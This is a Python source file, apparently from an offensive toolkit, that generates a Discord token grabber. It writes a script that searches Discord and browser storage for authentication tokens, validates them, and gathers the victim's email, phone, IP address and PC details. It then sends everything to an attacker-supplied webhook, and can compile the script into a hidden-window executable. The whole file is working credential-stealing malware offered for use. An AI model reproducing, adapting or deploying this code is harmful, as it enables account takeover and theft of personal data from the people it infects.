from colorama import Fore
import time, sys, os, shutil
from util.plugins.commun import * 

def tokengrabber():
    setTitle("File Grabber")
    def spinner():
        l = ['|', '/', '-', '\\']
        for i in l+l:
            sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Creating File... {i}""")
            sys.stdout.flush()
            time.sleep(0.2)
        print('\n')
        for i in l+l+l+l:
            sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Writing File... {i}""")
            sys.stdout.flush()
            time.sleep(0.2)

    clear()
    filegrabbertitle()
    print(f"{y}[{w}+{y}]{w} Enter the name you want to give to the final file: ")
    global filename
    fileName = str(input(f"{y}[{b}#{y}]{w} File name: "))
    print(f"""\n\n{y}[{w}+{y}]{w} Enter your WebHook to generate a Token Grabber containing it: """)
    global webhooklink
    webhooklink = str(input(f"{y}[{b}#{y}]{w} Webhook Link: "))
    print('\n')
    spinner()

    try:
        with open(f"output/{fileName}.py", "w") as file:
            file.write("""import os, re, json, requests, threading
from datetime import datetime
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
def main():
    def get_tokens():
        found_tokens = []
        path = [
        '_Roaming/Discord/Local Storage/leveldb',
        '_Roaming/Lightcord/Local Storage/leveldb',
        '_Roaming/discordptb/Local Storage/leveldb',
        '_Roaming/discordcanary/Local Storage/leveldb',
        '_Roaming/Opera Software/Opera Stable/Local Storage/leveldb',
        '_Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb',
        '_Local/Amigo/User Data/Local Storage/leveldb',
        '_Local/Torch/User Data/Local Storage/leveldb',
        '_Local/Kometa/User Data/Local Storage/leveldb',
        '_Local/Orbitum/User Data/Local Storage/leveldb',
        '_Local/CentBrowser/User Data/Local Storage/leveldb',
        '_Local/7Star/7Star/User Data/Local Storage/leveldb',
        '_Local/Sputnik/Sputnik/User Data/Local Storage/leveldb',
        '_Local/Vivaldi/User Data/Default/Local Storage/leveldb',
        '_Local/Google/Chrome SxS/User Data/Local Storage/leveldb',
        '_Local/Epic Privacy Browser/User Data/Local Storage/leveldb',
        '_Local/Google/Chrome/User Data/Default/Local Storage/leveldb',
        '_Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',
        '_Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb',
        '_Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',
        '_Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',
        '_Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb',
        ]
        for path in path:
            path = path.replace('_Local', os.getenv('LOCALAPPDATA')).replace('_Roaming', os.getenv('APPDATA'))
            if os.path.exists(path):
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
                            found_tokens.append(token)
        return list(set(found_tokens))
    def check_tokens(token_list: list):
        checked_tokens = []
        checker_thread = []
        def check(token: str):
            try:
                res = urlopen(Request('https://discord.com/api/v9/users/@me/library', headers= {'content-type': 'application/json', 'authorization': token, 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}, method= 'GET')).getcode()
                if res == 200:
                    checked_tokens.append(token)
            except: pass
        for token in token_list:
            checker_thread.append(threading.Thread(target= check, args=(token,)))
        valid_tokens = ''
        for token in checked_tokens:
            valid_tokens += f'\\n{token}'
        return valid_tokens
    def start():
        tokens = check_tokens(get_tokens())
        if tokens != '':
            try:
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                }
                res = requests.get('https://discordapp.com/api/v6/users/@me', headers={"Authorization": tokens})
                res_json = res.json()
                ip = getip()
                pc_username = os.getenv("UserName")
                pc_name = os.getenv("COMPUTERNAME")
                user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                user_id = res_json['id']
                email = res_json['email']
                phone = res_json['phone']
                mfa_enabled = res_json['mfa_enabled']
                has_nitro = False
                res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers={"Authorization": tokens})
                nitro_data = res.json()
                has_nitro = bool(len(nitro_data) > 0)
                days_left = 0
                if has_nitro:
                    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    days_left = abs((d2 - d1).days)
                embed = f\"""**{user_name}** *({user_id})*\\n
> :dividers: __Account Information__\\n\\tEmail: `{email}`\\n\\tPhone: `{phone}`\\n\\t2FA/MFA Enabled: `{mfa_enabled}`\\n\\tNitro: `{has_nitro}`\\n\\tExpires in: `{days_left if days_left else "None"} day(s)`\\n
> :computer: __PC Information__\\n\\tIP: `{ip}`\\n\\tUsername: `{pc_username}`\\n\\tPC Name: `{pc_name}`\\n
> :shield: __Token__\\n\\t`{tokens}`\\n
*Made by Astraa#6100* **|** ||https://github.com/astraadev||\"""
                payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                try:
                    req = Request('~~WEBHOOK_URL~~', data=payload.encode(), headers=headers)
                    urlopen(req)
                except: pass
            except: pass
    start()
if __name__ == '__main__':
    main()""".replace("~~WEBHOOK_URL~~", webhooklink))

    except Exception as e:
        print(f"""\n\n\n\n{y}[{Fore.LIGHTRED_EX }!{y}]{w}  Error writing file: {e}""")
        os.system(2)
        clear()
        main()

    print(f"""\n\n\n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} File has been correctly written to "output/{fileName}.py" """)
    convert = input(f"""{y}[{b}#{y}]{w} Convert your script into an executable (Y/N) ? """)
    if convert.upper() == 'Y' or convert.upper() == 'YES':
        try:
            time.sleep(1)
            clear()

            print(f'{y}[{b}#{y}]{w} File creation...')
            time.sleep(1)
            os.system(f"pyinstaller -y -F -w output/{fileName}.py")
            clear()
            print(f'{y}[{b}#{y}]{w} Cleaning up old files...')
            time.sleep(1)
            try:
                import shutil
                os.remove(f"{fileName}.spec")
                shutil.rmtree(f"build")
                shutil.move(f"dist/{fileName}.exe", "output")
                shutil.rmtree(f"dist")
                time.sleep(1)
            except:
                pass
            clear()
            filegrabbertitle()
            print(f"{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} The executable file has been correctly generated")
        except:
            clear()
            filegrabbertitle()
            print(f"{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} The executable file has been correctly generated")
            
        input(f"{y}[{b}#{y}]{w} Press ENTER to exit")
    else:
        input(f"{y}[{b}#{y}]{w} Press ENTER to exit")
    main()

tokengrabber()
